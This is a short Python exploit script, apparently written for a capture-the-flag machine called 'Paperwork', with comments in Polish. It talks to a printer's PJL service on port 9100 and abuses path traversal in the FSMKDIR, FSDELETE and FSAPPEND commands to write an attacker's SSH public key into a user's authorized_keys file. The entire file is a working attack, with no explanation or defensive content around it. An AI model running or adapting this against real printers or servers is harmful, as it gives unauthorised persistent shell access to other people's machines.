#!/usr/bin/env python3
"""
Paperwork — jeden strzał pivot (lp na target).
Zapis: @PJL FSAPPEND + NAME w 1. linii, SIZE w 2. linii, potem dokładnie N bajtów klucza.
(Na tym boxie FSUPLOAD = odczyt pliku, nie zapis.)
"""
import socket
import time

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def one(cmd: bytes, body: bytes = b"", timeout: float = 5) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect(("127.0.0.1", 9100))
    s.sendall(cmd + body)
    try:
        return s.recv(4096)
    except socket.timeout:
        return b""
    finally:
        s.close()


one(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
one(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode())

payload = f'@PJL FSAPPEND NAME="{PATH}"\r\nSIZE={N}\r\n'.encode() + KEY
print("append", one(payload, timeout=8))

time.sleep(1)
print("query", one(b'@PJL FSQUERY NAME="../.ssh"\r\n'))